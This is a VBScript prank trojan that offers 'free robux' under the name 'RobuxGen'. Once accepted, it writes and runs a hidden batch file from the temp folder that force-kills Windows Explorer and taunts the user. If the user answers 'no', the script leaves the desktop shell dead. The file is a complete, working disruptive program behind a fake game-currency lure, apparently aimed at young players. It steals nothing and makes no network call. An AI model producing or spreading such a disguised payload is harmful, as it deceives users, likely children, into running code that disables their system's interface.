result = MsgBox ("Want free robux?", vbYesNo + vbQuestion, "RobuxGen")
Select Case result
Case vbNo
    Wscript.Quit
End Select
Set temp = WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)

Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
FSO.DeleteFile temp & "\vbsfile.bat"
Set OutPutFile = FSO.OpenTextFile(temp & "\vbsfile.bat" ,8 , True)
OutPutFile.WriteLine("@echo off")
OutPutFile.WriteLine("C:")
OutPutFile.WriteLine("color 04")
OutPutFile.WriteLine("taskkill /f /im explorer.exe")
OutPutFile.WriteLine("cls")
OutPutFile.WriteLine("echo No free robux for you")
OutPutFile.WriteLine(":pcback")
OutPutFile.WriteLine("echo Want ur pc back?")
OutPutFile.WriteLine("set /p wants=[yes/no]: ")
OutPutFile.WriteLine("if %wants% == yes goto yes")
OutPutFile.WriteLine("if %wants% == no goto no")
OutPutFile.WriteLine("goto pcback")
OutPutFile.WriteLine(":yes")
OutPutFile.WriteLine("color 02")
OutPutFile.WriteLine("echo Ok, I was just joking anyways")
OutPutFile.WriteLine("start C:\Windows\explorer.exe")
OutPutFile.WriteLine("echo bye")
OutPutFile.WriteLine("timeout /t 5")
OutPutFile.WriteLine("exit")
OutPutFile.WriteLine(":no")
OutPutFile.WriteLine("color 08")
OutPutFile.WriteLine("echo What is wrong with you?")
OutPutFile.WriteLine("echo Have your pc back anyways")
OutPutFile.WriteLine("echo No explorer though")
OutPutFile.WriteLine("echo You'll figure it out yourself")
OutPutFile.WriteLine("timeout /t 5")
OutPutFile.WriteLine("exit")
OutPutFile.close
Set FSO= Nothing

CreateObject("Wscript.Shell").Run temp & "\vbsfile.bat", 1